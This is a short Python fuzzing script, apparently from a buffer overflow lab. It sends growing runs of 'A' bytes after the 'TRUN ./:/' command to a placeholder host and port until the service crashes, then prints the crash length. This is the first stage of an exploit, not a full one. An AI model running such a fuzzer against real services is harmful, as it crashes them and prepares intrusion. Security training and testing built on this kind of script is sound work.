#!/usr/bin/env python3

import sys, socket
from time import sleep

ip='<ip>'
port=<port>
buffersize_incr=100

buffer=b'A'*buffersize_incr

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(5)   # 5 seconds
        s.connect((ip, port))
        s.send(b'TRUN ./:/'+buffer)
        s.recv(1024)
        print('Sending {} bytes'.format(str(len(buffer))))
        s.close()
        sleep(1)
        buffer=buffer+b'A'*buffersize_incr
    except OSError as e:
        print('Crashed at {} bytes'.format(str(len(buffer))))
        sys.exit()
